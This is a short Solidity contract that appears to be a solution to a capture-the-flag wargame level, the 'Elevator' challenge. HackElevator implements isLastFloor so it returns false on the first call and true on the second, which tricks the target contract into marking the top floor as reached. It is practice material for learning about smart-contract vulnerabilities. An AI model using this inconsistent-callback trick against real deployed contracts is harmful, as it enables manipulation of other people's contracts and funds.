// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import "./Elevator.sol";


contract HackElevator {

    Elevator elevator;
    uint private i = 0;

    constructor(address elevatorAddress) public {
        elevator = Elevator(elevatorAddress);
    }

    function isLastFloor(uint floor) external returns (bool) {
        if (i == 0) {
            i += 1;
            return false;
        } else {
            return true;
        }

    }

    function hack() public {
        elevator.goTo(0);
    }

}
